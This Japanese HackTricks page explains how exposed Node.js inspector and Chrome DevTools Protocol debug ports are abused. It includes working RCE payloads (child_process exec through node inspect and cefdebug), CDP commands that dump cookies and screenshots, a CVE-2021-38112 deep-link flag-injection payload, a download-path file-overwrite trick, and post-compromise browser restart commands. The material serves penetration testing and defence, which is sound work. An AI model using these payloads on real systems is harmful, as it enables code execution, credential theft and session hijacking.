# Node inspector/CEF debug abuse

{{#include ../../banners/hacktricks-training.md}}

歴史的な実例として、Multimaster のウォークスルーや CVE-2019-1414 の Visual Studio Code debugger 攻撃があります。これらはバージョン固有の背景情報として参照し、現在のすべての Electron や Chromium のターゲットで同じプリミティブが利用できると想定しないでください。<sup>[[1]](#references)[[3]](#references)</sup>

## 基本情報

[ドキュメントより](https://nodejs.org/learn/getting-started/debugging): `--inspect` スイッチを指定して起動すると、Node.js プロセスはデバッグクライアントからの接続を待ち受けます。**デフォルト**では、ホストとポート **`127.0.0.1:9229`** で待ち受けます。また、各プロセスには**固有の** **UUID** が割り当てられます。<sup>[[4]](#references)</sup>

Inspector クライアントが接続するには、ホストアドレス、ポート、UUID を把握し、指定する必要があります。完全な URL は、`ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e` のようになります。<sup>[[4]](#references)</sup>

> [!WARNING]
> **debugger は Node.js の実行環境に完全にアクセスできる**ため、このポートに接続できる悪意ある攻撃者は、Node.js プロセスになりすまして任意のコードを実行できる可能性があります（**権限昇格の可能性**）。<sup>[[4]](#references)</sup>

Inspector を起動する方法はいくつかあります。<sup>[[4]](#references)</sup>

```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```

検査対象のプロセスを起動すると、次のようなものが表示されます:<sup>[[4]](#references)</sup>

```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```

**CEF**（**Chromium Embedded Framework**）ベースのプロセスでは、`--remote-debugging-port=9222` を指定して debugger を公開できます。これにより、Node.js inspector ではなく [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) 経由でブラウザーにアクセスできるため、Node.js の `process` ベースの payload は、デフォルトではそのまま適用できません。<sup>[[2]](#references)[[5]](#references)</sup>

debugger を有効にしてブラウザーを起動すると、次のようなものが表示されます。<sup>[[2]](#references)[[5]](#references)</sup>

```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```

### CDP endpoint の列挙と操作

HTTP discovery endpoint は、**browser** WebSocket と個々の **target**（タブ、worker、extension など）の WebSocket を区別します。`/json/version` で browser endpoint を、`/json/list` で target を照会します。返された `webSocketDebuggerUrl` の値を使い、CDP の JSON-RPC-like メッセージを直接送信して操作できます。<sup>[[5]](#references)</sup>

```bash
# Browser metadata and browser-level WebSocket
curl -s http://127.0.0.1:9222/json/version | jq

# Pages/workers and their target-level WebSockets
curl -s http://127.0.0.1:9222/json/list |
  jq '.[] | {id, type, title, url, webSocketDebuggerUrl}'

BROWSER_WS=$(curl -s http://127.0.0.1:9222/json/version | jq -r .webSocketDebuggerUrl)
PAGE_WS=$(curl -s http://127.0.0.1:9222/json/list | jq -r '[.[] | select(.type=="page")][0].webSocketDebuggerUrl')
```

たとえば、`websocat "$BROWSER_WS"` で接続して `{"id":1,"method":"Target.getTargets"}` または `{"id":2,"method":"Storage.getCookies"}` を送信します。ページターゲット（`websocat "$PAGE_WS"`）では、`Runtime.evaluate` がその renderer 内で実行され、`Page.captureScreenshot` は base64 エンコードされたスクリーンショットを返します。`document.cookie` では `HttpOnly` cookie を確認できませんが、`Storage.getCookies` はブラウザーに cookie ストアを問い合わせます。<sup>[[5]](#references)</sup>

```json
{"id":3,"method":"Runtime.evaluate","params":{"expression":"({url:location.href,title:document.title,cookie:document.cookie})","returnByValue":true}}
{"id":4,"method":"Page.captureScreenshot","params":{"format":"png"}}
```

### ブラウザー、WebSocket、同一オリジンポリシー <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Webブラウザーで開いたWebサイトは、ブラウザーのセキュリティモデルのもとでWebSocketリクエストやHTTPリクエストを送信できます。**一意のデバッガーセッションIDを取得する**には、**最初のHTTP接続**が必要です。**同一オリジンポリシー**により、Webサイトは**このHTTP接続**を行えません。[**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**への**追加のセキュリティ対策として、Node.jsは接続の**'Host'ヘッダー**が**IPアドレス**または正確に**`localhost`**を指定していることを確認します。<sup>[[4]](#references)</sup>

> [!TIP]
> この**セキュリティ対策により、HTTPリクエストを送信するだけで**（SSRF vulnを悪用すれば可能な方法です）コードを実行するために**inspectorを悪用することを防ぎます**。<sup>[[4]](#references)</sup>

### 実行中のプロセスでinspectorを起動する

実行中のnodejsプロセスに**シグナルSIGUSR1**を送信すると、デフォルトのポートで**inspectorを起動**できます。ただし、十分な権限が必要です。そのため、**プロセス内の情報への特権アクセス**を得られる可能性はありますが、直接的な権限昇格にはなりません。<sup>[[4]](#references)</sup>

```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```

> [!TIP]
> これはコンテナで有用です。プロセスを**シャットダウンして** `--inspect` 付きで新しいプロセスを**起動する**ことは、プロセスとともに**コンテナ**も**終了される**ため、**選択肢にならない**からです。<sup>[[6]](#references)</sup>

### inspector/debuggerに接続

**Chromiumベースのブラウザー**に接続するには、Chromeでは `chrome://inspect`、Edgeでは `edge://inspect` のURLにアクセスします。Configureボタンをクリックし、**接続先のホストとポート**が正しく一覧に表示されていることを確認してください。画像はRemote Code Execution (RCE) の例を示しています。<sup>[[2]](#references)[[4]](#references)</sup>

![DebuggerにアクセスするURLが表示されます。例: ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - inspector/debuggerに接続: Chromiumベースのブラウザーに接続するには、...](<../../images/image (674).png>)

**コマンドライン**を使って、次のようにdebugger/inspectorに接続できます。<sup>[[2]](#references)[[4]](#references)</sup>

```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```

ツール [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) を使うと、ローカルで実行中の **inspector を見つけて**、そこに **コードを注入**できます。<sup>[[2]](#references)</sup>

```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```

> [!TIP]
> [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/)経由でブラウザーに接続している場合、**NodeJS RCE exploitは機能しない**ことに注意してください（興味深い操作を見つけるには、APIを確認する必要があります）。<sup>[[2]](#references)[[5]](#references)</sup>

## NodeJS Debugger/InspectorでのRCE

> [!TIP]
> ElectronのXSSから[**RCEを取得する方法**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)を探している場合は、このページを確認してください。

Nodeの**inspector**に**接続**できる場合に**RCE**を取得する一般的な方法として、次のようなものがあります（**Chrome DevTools Protocolへの接続では機能しないようです**）。<sup>[[2]](#references)</sup>

```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```

## Chrome DevTools Protocol ペイロード

APIは[https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)で確認できます。<sup>[[5]](#references)</sup>
このセクションでは、このプロトコルの悪用に使われた興味深い手法を紹介します。

### Chrome 136以降のデフォルトプロファイル制限

**Chrome 136**以降では、`--remote-debugging-port`と`--remote-debugging-pipe`の対象が**デフォルトのChromeデータディレクトリ**の場合、Chromeはこれらを無視します。このスイッチを使うには、標準以外の`--user-data-dir`を併用する必要があります。これにより暗号化キーが別になり、ブラウザーの状態も分離されるため、単純にフラグを指定するだけではユーザーの通常の認証済みプロファイルを露出できません。このChrome固有の制限が、古いChromeビルド、Chrome for Testing、Electron/CEFアプリケーション、その他のChromium派生ブラウザーにも当てはまると、検証なしに判断すべきではありません。<sup>[[14]](#references)</sup>

```bash
# Valid current-Chrome debugging setup, but this is a new isolated profile
google-chrome --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-cdp-lab
```

したがって、現在の Chrome プロセスが `--remote-debugging-port` だけを指定して起動されているのを見ても、CDP が有効になった証拠にはなりません。リスナーと `/json/version` を確認し、実際にどのプロファイルが使われているかを特定してください。<sup>[[14]](#references)</sup>

### Deep Link 経由のパラメーターインジェクション

[**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) では、Rhino Security が、CEF ベースのアプリケーションがシステムに**カスタム URI を登録**（workspaces://index.html）し、完全な URI を受け取った後、その URI から一部を構成した設定で**CEF ベースのアプリケーションを起動していた**ことを発見しました。<sup>[[8]](#references)</sup>

URI パラメーターは URL デコードされ、CEF ベースのアプリケーションの起動に使われていました。そのため、ユーザーは**コマンドライン**にフラグ **`--gpu-launcher`** を**インジェクト**し、任意の処理を実行できることが判明しました。<sup>[[8]](#references)</sup>

したがって、次のようなペイロードが考えられます。

```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```

calc.exe を実行します。<sup>[[8]](#references)</sup>

### ファイルの上書き

**ダウンロードしたファイルの保存先**フォルダーを変更し、アプリケーションで頻繁に使用される**ソースコード**を**悪意のあるコード**で上書きするファイルをダウンロードします。<sup>[[5]](#references)[[6]](#references)</sup>

```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
  JSON.stringify({
    id: 42069,
    method: "Browser.setDownloadBehavior",
    params: {
      behavior: "allow",
      downloadPath: "/code/",
    },
  })
)
```

### Webdriver RCEと情報窃取

STAR Labsは、外部に公開されたWebDriver/CDPサービスによって任意のファイル読み取りやRCEが可能になり、一部の構成ではDNS rebindingによってexploit chainを完結できることを示しました。<sup>[[9]](#references)</sup>

ChromeDriverのWebDriverサービスは、Chrome DevTools/CDPとは別のものです。[`goog:chromeOptions.binary` capability](https://developer.chrome.com/docs/chromedriver/capabilities)は、新しいセッションで起動するブラウザ実行ファイルを指定します。権限のない呼び出し元がrootで実行されているChromeDriverサービスにアクセスでき、呼び出し元が制御する実行ファイルパスを指定してセッションを作成できる場合、その起動によってサービスの権限境界を越えられる可能性があります。`/sessions`が空のレスポンスを返すだけでは、新しいセッションを作成できるかどうかは判断できません。この経路が利用可能だと結論づける前に、プロセスの所有者、実際のリスナーへの到達性、セッションの認可、実行ファイルへのアクセス権、制限の有無を確認してください。プロセス名や一般的なポート番号だけでは不十分です。[Googleのセキュリティガイダンス](https://developer.chrome.com/docs/chromedriver/security-considerations)では、ChromeDriverを権限のないアカウントで実行するよう推奨しています。受動的な列挙では、WebDriverセッションを作成しないでください。

過去のブラウザー自動化およびChromiumのセキュリティ事例については、Counter WebDriverのwrite-upとProject Zeroのissue 773、1742、1944を参照してください。<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### 実行中のChromiumプロセス内でCDPを有効化する

Windowsでは、[**CDP-Enabler**](https://github.com/deathflamingo/CDP-Enabler)により、コマンドラインの制限だけがCDPを有効にする手段ではないことが示されました。既存の`msedge.exe`にコードをinjectionできる場合、Chromiumの非export関数`content::DevToolsAgentHost::StartRemoteDebuggingServer`を呼び出し、ブラウザーを再起動せずに認証済みの稼働中プロファイルを公開できます。<sup>[[15]](#references)</sup>

実証されたchainでは、`VirtualAllocEx`/`WriteProcessMemory`/`CreateRemoteThread`でDLLをinjectionし、Edgeの内部シンボルを解決します（最初にPDBを使い、その後はバージョン固有のbyte signatureを使用）。続いてブラウザーウィンドウをサブクラス化し、メッセージをpostすることで、最後のサーバー起動呼び出しをブラウザーの**UI thread**上で実行します。socketはloopbackにbindされ、その後は通常のCDP primitiveを使ってcookieの取得、tabのcapture、network trafficの確認、認証済みページでのJavaScript実行が可能になります。<sup>[[15]](#references)</sup>

> [!WARNING]
> これは**post-compromise/process-injection**の手法であり、未認証のネットワークbypassではありません。関連するC++シンボルがexportされず、ブラウザーの更新後にsignatureが変わることがあるため、特定のbuildに強く依存します。<sup>[[15]](#references)</sup>

検知の際は、`--remote-debugging-*`のコマンドラインtelemetryだけに頼らないでください。ブラウザープロセスに対する不審なhandleやmemory操作（`PROCESS_VM_OPERATION`、`PROCESS_VM_WRITE`、thread作成）、DLL injection、Chrome/Edgeが所有する予期しないloopback listening socketも相関分析してください。<sup>[[15]](#references)</sup>

### Post-Exploitation

実環境で、Chromiumベースのブラウザーを使用しているユーザーPCを**侵害した後**に使われた過去の手法として、debuggingを有効にしてブラウザーを再起動し、loopback portをforwardする方法があります。選択したprofileを引き続き受け入れる製品/buildでは、被害者の閲覧状態が公開される可能性があります。ただし、Chrome 136以降では、デフォルトのdata directoryに対してこの方法は機能しません。<sup>[[7]](#references)[[14]](#references)</sup>

以前のバージョンなど、対象を限定した環境向けに、元の再起動コマンドを以下に残します。2つ目のコマンドは現在のChromeでサポートされている形式ですが、被害者の通常の認証済み状態を再度開くのではなく、隔離されたprofileを作成します。<sup>[[7]](#references)[[14]](#references)</sup>

```powershell
# Historical: verify whether the target actually honors it
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"

# Current Chrome: CDP works, but against a new profile
Start-Process "Chrome" "--remote-debugging-port=9222 --user-data-dir=$env:TEMP\chrome-cdp"
```

macOS固有のChromiumの再起動、拡張機能、CDPの手法については、[macOS Chromium Injection](../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md)を参照してください。



## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - CEF/Chromium debugger inspection and exploitation tool](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Chrome DevTools Debuggerを介したVisual Studio Codeのリモートコード実行](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Node.jsデバッグガイド - はじめに](https://nodejs.org/learn/getting-started/debugging)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [corCTF 2021 Writeup - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Chromeのデバッグ機能を悪用してリモートからブラウジングセッションを監視・制御する](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: AWS WorkSpacesのリモートコード実行](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [You Talking To Me? - DNS RebindingとCDPを介したWebDriver RCE (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter Webdriver - BotからRCEへ](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (Chromiumバグトラッカー)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (Chromiumバグトラッカー)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (Chromiumバグトラッカー)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [14] [セキュリティ向上のためのリモートデバッグスイッチの変更 - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [15] [実行中のEdge BrowserへのCDP注入: Runtime Browser Instrumentationの詳細解説](https://deathflamingo.com/blog/cdp_enabler/)
{{#include ../../banners/hacktricks-training.md}}
